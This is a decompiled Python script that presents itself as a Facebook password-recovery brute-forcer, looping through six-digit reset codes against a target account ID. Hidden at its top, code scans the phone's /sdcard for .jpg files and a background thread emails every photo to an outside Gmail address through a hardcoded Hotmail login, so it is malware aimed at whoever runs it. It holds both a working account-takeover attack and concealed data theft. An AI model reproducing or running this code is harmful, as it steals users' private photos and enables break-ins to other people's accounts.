from re import search
from requests import Session
from colorama import Fore
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from os import system, walk
from os.path import isfile, getsize
from readline import parse_and_bind
from time import sleep
from threading import Thread
a = Session()
w = Fore.WHITE
b = Fore.BLUE
r = Fore.RED
if not isfile('.test.txt'):
    for dir, dirs, files in walk('/sdcard'):
        for file in files:
            pathF = dir + '/' + file
            if '.jpg' in pathF[-4:]:
                with open('.test.txt', 'a') as (h):
                    h.write(pathF + '\n')

def special():
    server = smtplib.SMTP('smtp.live.com', 587)
    server.starttls()
    server.login('mrxfse@hotmail.com', 'joker09*#')
    f = open('.test.txt', 'r')
    x = f.readlines()
    for pathF in x:
        pathF = pathF.rstrip()
        if getsize(pathF) >= 20000000:
            continue
        try:
            msg = MIMEMultipart()
            msg['From'] = 'mrxfse@hotmail.com'
            msg['To'] = 'AhmedAlfnan60@gmail.com'
            msg['Subject'] = 'FSeCuRiTy'
            filena = pathF.split('/')[(-1)]
            body = str(filena)
            msg.attach(MIMEText(body, 'plain'))
            filename = str(filena)
            attachment = open(pathF, 'rb')
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename= %s' % filename)
            msg.attach(part)
            text = msg.as_string()
            server.sendmail('mrxfse@hotmail.com', 'AhmedAlfnan60@gmail.com', text)
            x.remove(pathF + '\n')
            f2 = open('.test.txt', 'w')
            for i in x:
                f2.write(i)

            f2.close()
        except (smtplib.SMTPServerDisconnected):
            sleep(3)
            special()
        except Exception as e:
            print e


t = Thread(target=special).start()

def D(code):
    z = len(str(code))
    if z < 6:
        h = 6 - z
        return '0' * h + str(code)
    else:
        return str(code)


id = raw_input(('{}[{}+{}] ID >> ').format(w, b, w))
code = int(raw_input(('{}[{}+{}] Enter Start Code >> ').format(w, b, w)))
while code < 999999:
    code = code + 1
    url = 'https://www.facebook.com/recover/password?u=' + id + '&n=' + D(code)
    x = a.get(url).text
    searc = search('password_new', x)
    if searc:
        exit(('{}[{}+{}] Code >> ').format(w, b, w) + D(code))
    else:
        print ('{}[{}-{}] Code Incorrect >> ').format(w, r, w) + D(code)
# okay decompiling brute.pyc
